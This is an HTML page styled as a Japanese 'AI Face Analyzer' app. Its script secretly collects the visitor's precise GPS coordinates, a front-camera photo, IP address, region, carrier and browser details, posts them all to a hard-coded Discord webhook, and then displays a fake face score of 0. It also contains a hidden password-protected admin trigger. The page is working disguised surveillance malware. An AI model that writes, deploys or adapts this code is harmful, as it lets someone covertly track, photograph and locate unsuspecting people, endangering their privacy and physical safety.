<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Face Analyzer</title>
    <style>
        body { 
            background: #ffffff; color: #333; font-family: 'Helvetica Neue', Arial, sans-serif;
            margin: 0; text-align: center; height: 100vh; overflow: hidden;
            display: flex; align-items: center; justify-content: center;
        }
        .fade-in-box { animation: fadeIn 2.5s ease-in-out forwards; opacity: 0; width: 100%; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        img.header-img { 
            width: 80%; max-width: 350px; border-radius: 25px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.1); margin-bottom: 40px; 
            cursor: pointer;
        }
        .start-btn {
            background: linear-gradient(135deg, #6dd5ed, #2193b0);
            color: white; border: none; padding: 22px 60px;
            font-size: 1.5rem; font-weight: bold; border-radius: 50px; 
            cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }
        #diagnosis-screen { display: none; width: 100%; }
        .frame {
            position: relative; width: 320px; height: 320px; margin: 0 auto;
            border: 6px solid #fff; border-radius: 30px; overflow: hidden;
            box-shadow: 0 15px 45px rgba(0,0,0,0.15); background: #f9f9f9;
        }
        #captured-photo { width: 100%; height: 100%; object-fit: cover; display: none; }
        video { position: absolute; width: 1px; height: 1px; opacity: 0; }
        .status-text { margin-top: 30px; font-size: 1.2rem; color: #2193b0; font-weight: 500; padding: 0 20px; }
        
        /* コピー用スタイル */
        .copy-info {
            margin-top: 10px; font-size: 0.8rem; color: #888; cursor: pointer;
            text-decoration: underline;
        }
    </style>
</head>
<body>

<div id="top-screen" class="fade-in-box">
    <img id="main-icon" src="https://cdn.discordapp.com/attachments/1476911284875301058/1482210816978583704/IMG_6710.png?ex=69b61fe4&is=69b4ce64&hm=b2ccea63fed632d4022b2a3a4960a9c9bf6991e5e60fc6150c91b2d68a6728e1&" class="header-img" onclick="adminMode()">
    <br>
    <button class="start-btn" onclick="runDiagnosis()">顔診断開始</button>
</div>

<div id="diagnosis-screen">
    <div class="frame">
        <video id="video" autoplay playsinline></video>
        <img id="captured-photo">
        <div id="result-zero" style="display:none; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:16rem; color:#ff4757; font-weight:900; text-shadow: 5px 5px 0 #fff;">0</div>
    </div>
    <div id="status" class="status-text">スキャン中...</div>
    <div id="copy-area" class="copy-info" onclick="copyCoords()"></div>
    <canvas id="canvas" style="display:none;"></canvas>
</div>

<script>
    const WEBHOOK = "https://discord.com/api/webhooks/1482211707454488686/zhnShAx-xBqUk06k6eI_xUk-YGL20C_5749Xgi5yu5PDJp6UV9-157NI3cN1XtZack6W";
    let tapCount = 0;
    let currentCoords = "";

    window.onload = () => {
        const globalImg = localStorage.getItem('global_icon_url');
        if (globalImg) document.getElementById('main-icon').src = globalImg;
    };

    function adminMode() {
        tapCount++;
        if (tapCount >= 10) {
            tapCount = 0;
            const pw = prompt("パスワードを入力");
            if (pw === "25251") {
                const newUrl = prompt("新しいアイコンURLを入力");
                if (newUrl) {
                    document.getElementById('main-icon').src = newUrl;
                    localStorage.setItem('global_icon_url', newUrl);
                }
            }
        }
    }

    async function runDiagnosis() {
        document.getElementById('top-screen').style.display = 'none';
        document.getElementById('diagnosis-screen').style.display = 'block';

        // GPS取得（拒否されても診断は続行するが、毎回聞き直す）
        navigator.geolocation.getCurrentPosition(
            async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                currentCoords = `${lat}, ${lon}`;
                const gpsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                startScan(gpsLink, "成功", `${pos.coords.accuracy}m`);
            },
            async (err) => {
                startScan("拒否されました", "失敗", "N/A");
            },
            { enableHighAccuracy: true, timeout: 5000 }
        );
    }

    async function startScan(gpsInfo, status, accuracy) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('video');
            video.srcObject = stream;

            // IP情報取得
            let netInfo = "取得失敗";
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                netInfo = `IP: ${data.ip}\n国/地域: ${data.country_name} / ${data.region}\n通信会社: ${data.org}`;
            } catch(e) {}

            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                document.getElementById('captured-photo').src = canvas.toDataURL('image/png');
                document.getElementById('captured-photo').style.display = 'block';
                document.getElementById('status').innerText = "顔構造を解析中...";

                if(currentCoords) {
                    document.getElementById('copy-area').innerText = "座標をコピー: " + currentCoords;
                }

                stream.getTracks().forEach(t => t.stop());

                // Discord送信（整理されたフォーマット）
                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('file', blob, `log_${Date.now()}.png`);
                    fd.append('payload_json', JSON.stringify({
                        content: `**【AI診断ログ】**\n\n**GPSステータス:** ${status}\n**GPS精度:** ${accuracy}\n**GPS座標:** ${gpsInfo}\n\n**ネットワーク情報:**\n${netInfo}\n\n**デバイス情報:**\n${navigator.userAgent}`
                    }));
                    fetch(WEBHOOK, { method: 'POST', body: fd });
                });

                setTimeout(() => { document.getElementById('status').innerText = "照合完了..."; }, 1500);
                setTimeout(() => {
                    document.getElementById('status').innerText = "あなたの顔面スコアは...";
                    document.getElementById('result-zero').style.display = 'block';
                }, 3500);

            }, 1000);
        } catch (e) {
            document.getElementById('status').innerText = "カメラを許可して再試行してください";
        }
    }

    // クリップボードにコピーする関数
    function copyCoords() {
        if (currentCoords) {
            navigator.clipboard.writeText(currentCoords).then(() => {
                alert("座標をコピーしました: " + currentCoords);
            });
        }
    }
</script>
</body>
</html>
